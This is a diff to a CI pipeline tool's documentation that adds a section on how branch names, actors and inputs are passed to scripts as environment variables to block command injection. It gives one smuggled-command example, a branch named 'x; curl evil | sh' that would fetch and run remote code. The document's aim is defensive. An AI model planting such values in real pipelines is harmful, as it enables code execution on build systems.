@@ -209,6 +209,10 @@ jobs:
 
 Templates are expanded when the file is parsed. A template cannot use another template.
 
+### Expressions in scripts
+
+In a `run` (or `test` `command`) script, `${{ branch }}`, `${{ ref }}`, `${{ tag }}`, `${{ actor }}`, `${{ inputs.* }}` and `${{ needs.*.outputs.* }}` are not pasted into the script text, because a branch name or PR author is attacker-controlled. Each is passed to the shell as an environment variable and the script sees a `${PIPELINE_EXPR_*}` reference instead, so a branch named `x; curl evil | sh` is only ever data. `${{ matrix.* }}`, `${{ env.* }}`, `${{ secrets.* }}`, `${{ sha }}`, `${{ app }}`, `${{ job }}`, `${{ run.* }}` and `${{ pipeline }}` come from the pipeline file or validated identifiers and are still substituted directly. Inside single quotes the reference is not expanded, so write `"${{ branch }}"` rather than `'${{ branch }}'`, and quote it when it may contain spaces.
+
 ### Artifacts and caches
 
 Artifacts are stored in a per-run volume and are shared between jobs that run on the same node. A `cache` entry mounts a named volume that survives between runs of the same app, keyed by `key`.
